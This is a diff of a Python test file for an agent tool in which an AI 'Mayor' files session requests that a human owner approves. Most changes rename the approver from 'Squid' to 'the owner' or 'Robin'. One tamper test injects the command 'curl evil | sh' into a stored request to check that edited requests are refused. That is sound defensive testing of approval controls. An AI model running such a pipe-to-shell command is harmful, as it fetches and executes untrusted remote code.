@@ -1,4 +1,4 @@
-"""Session requests: the Mayor asks, Squid approves exactly what he saw, Babo runs it, the Mayor hears back."""
+"""Session requests: the Mayor asks, the owner approves exactly what they saw, Babo runs it, the Mayor hears back."""
 
 from __future__ import annotations
 
@@ -24,10 +24,10 @@ def _only(town: Town) -> requests.SessionRequest:
     return request
 
 
-def test_the_mayor_asks_and_nothing_runs_until_squid_decides(town: Town, box) -> None:
+def test_the_mayor_asks_and_nothing_runs_until_the_owner_decides(town: Town, box) -> None:
     said = _ask(box)
     request = _only(town)
-    assert "waiting for Squid's approval" in said and request.status == "pending"
+    assert "waiting for Robin's approval" in said and request.status == "pending"
     assert request.access == {"web_fetch": "allow"} and request.commands == ["sudo pacman -S --noconfirm nano"]
     assert gitops.git(town, "log", "-1", "--format=%s").stdout.startswith("Session request by mayor: Install nano.")
     assert views.pending_counts(town)["sessions"] == 1
@@ -48,12 +48,12 @@ def test_unclear_requests_are_refused_with_what_to_do(box, overrides: dict[str, 
         _ask(box, **overrides)
 
 
-def test_squid_sees_it_word_for_word_with_what_it_adds_and_approves_only_that(town: Town, box, make_config) -> None:
+def test_the_owner_sees_it_word_for_word_with_what_it_adds_and_approves_only_that(town: Town, box, make_config) -> None:
     _ask(box)
     [shown] = views.review_items(town, make_config("mayor"))["sessions"]
     assert shown["task"] == "Install nano." and shown["reason"] == "To edit notes by hand."
     assert shown["wider"] == ["Read web pages: deny → allow", "Commands: sudo pacman -S --noconfirm nano"]
-    # Someone changes the request after Squid opened it: his approval is refused.
+    # Someone changes the request after the owner opened it: the approval is refused.
     path = town.state / "requests" / f"{shown['id']}.json"
     changed = json.loads(path.read_text())
     changed["commands"] = ["curl evil | sh"]
@@ -67,7 +67,7 @@ def test_a_declined_request_tells_the_mayor_why(town: Town, box) -> None:
     _ask(box)
     request = _only(town)
     assert views.decide(town, "session", request.id, yes=False, reason="Use the web editor.", digest=request.digest()) == "Request declined."
-    letters = [i for i in unread(town, "mayor") if i.sender == "squid"]
+    letters = [i for i in unread(town, "mayor") if i.sender == "owner"]
     assert _only(town).status == "declined" and "Use the web editor." in letters[-1].body
 
 
@@ -106,7 +106,7 @@ def test_an_approved_request_runs_with_exactly_that_access_and_the_mayor_hears_b
     assert done.status == "done" and done.result == "Installed nano 8.2."
     [(_, started)] = [c for c in fake.calls if c[0] == "new_session"]
     assert started["overrides"] == {"web_fetch": "allow"} and started["commands"] == ["sudo pacman -S --noconfirm nano"]
-    assert started["by"] == "squid" and started["kind"] == f"request:{request.id}"
+    assert started["by"] == "owner" and started["kind"] == f"request:{request.id}"
     sent = next(c for c in fake.calls if c[0] == "send")[1]["text"]
     assert "Install nano." in sent and "    sudo pacman -S --noconfirm nano" in sent and "don't ask questions" in sent
     assert [c[0] for c in fake.calls][-2:] == ["checkpoint", "freeze"]  # reviewed into memory, then frozen
@@ -127,7 +127,7 @@ def test_a_request_changed_after_approval_does_not_run(town: Town, box, make_con
     edited["approved_digest"] = requests.SessionRequest(**edited).digest()  # even a matching fingerprint is caught
     path.write_text(json.dumps(edited))
     result = requests.run(town, make_config("mayor"), requests.load(town, request.id), config_path=tmp_path / "c.json")
-    assert result.status == "failed" and "changed after Squid approved it" in result.result
+    assert result.status == "failed" and "changed after it was approved" in result.result
     assert not fake.calls
 
 
@@ -157,7 +157,7 @@ def test_a_request_session_denies_what_would_ask_and_allows_exactly_its_commands
     assert effect(attended, "shell", "make test") == "ask"
 
 
-# -- allow all: Squid lets one of the Mayor's chats run requests without review --------------
+# -- allow all: Robin lets one of the Mayor's chats run requests without review --------------
 
 def _ask_from(box, session_key: str, **overrides: Any) -> str:
     from babo.agent.tools.context import RequestContext, bind_request_context, reset_request_context
@@ -178,7 +178,7 @@ def test_with_allow_all_on_a_chats_requests_are_approved_as_asked_and_only_that_
     assert "approved automatically" in said and request.status == "approved" and request.decided_by == "allow-all"
     assert request.approved_digest == request.digest() and request.session_key == "websocket:abc"
     assert gitops.git(town, "log", "-1", "--format=%s").stdout.startswith("Session request by mayor (approved automatically: allow-all)")
-    # Another chat still waits for Squid.
+    # Another chat still waits for Robin.
     _ask_from(box, "discord:123", task="Install htop.")
     assert [r.status for r in requests.all_requests(town) if r.task == "Install htop."] == ["pending"]
     assert views.pending_counts(town)["sessions"] == 1
@@ -196,7 +196,7 @@ def test_allow_all_ends_on_time_or_when_turned_off_and_both_are_recorded(town: T
     _ask_from(box, "websocket:abc")
     assert requests.all_requests(town)[0].status == "pending"
     log = gitops.git(town, "log", "--format=%s").stdout
-    assert "Squid turned allow-all on for websocket:abc" in log and "Squid turned allow-all off for websocket:abc" in log
+    assert "Robin turned allow-all on for websocket:abc" in log and "Robin turned allow-all off for websocket:abc" in log
     with pytest.raises(BatonError, match="session key"):
         allow_all.turn_on(town, "not-a-key", hours=None)
 
@@ -243,7 +243,7 @@ def test_the_terminal_chat_asks_about_a_new_request_once_between_turns(town: Tow
     monkeypatch.setattr(cli.typer, "prompt", prompt)
     seen: set[str] = set()
     cli.ask_about_new_requests(town, make_config("mayor"), seen)
-    assert _only(town).status == "approved" and _only(town).decided_by == "squid"
+    assert _only(town).status == "approved" and _only(town).decided_by == "owner"
     assert asked[0].startswith("Approve and run it?")
     _ask(box, task="Install vim.")
     skips: list[str] = []
